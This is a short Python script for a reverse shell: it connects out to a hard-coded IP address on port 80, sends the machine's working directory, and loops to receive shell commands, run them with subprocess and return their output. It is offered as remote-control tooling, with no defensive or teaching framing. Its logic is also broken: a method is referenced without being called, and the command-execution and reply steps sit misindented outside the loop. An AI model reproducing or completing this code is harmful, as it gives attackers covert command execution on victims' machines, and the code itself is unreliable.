import socket
import os
import subprocess
import sys


s = socket.socket()

Name = socket.gethostname() #Gets name of Device
Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device

#get IP Address of Current Machine
Port = 80
Size = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# connect to the server
s.connect(('10.67.98.152', Port)) #Your IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact

confirm = s.recv(Size).decode()
print(confirm)

cwd = os.getcwd() #Sets cwd to os.getcwd()
s.send(cwd.encode()) #Sends the cwd to the Host

#Need to make it so you can just type in commands and allows to do almost anything. 
while True:
    command = s.recv(Size).decode()









    splited = command.split()

    if command.lower() == "exit":
        break

    if splited[0].lower == "cd":
        try:
            os.chdir(' '.join(splited[1:]))

        except FileNotFoundError as e:
            output = str(e)

        else:
            output = ""
else:
    output = subprocess.getoutput(command) #Need to fix in order to get the output from command 

cwd = os.getcwd()

message = f"{output}{SEPARATOR}{cwd}" 

s.send(message.encode())

s.close()




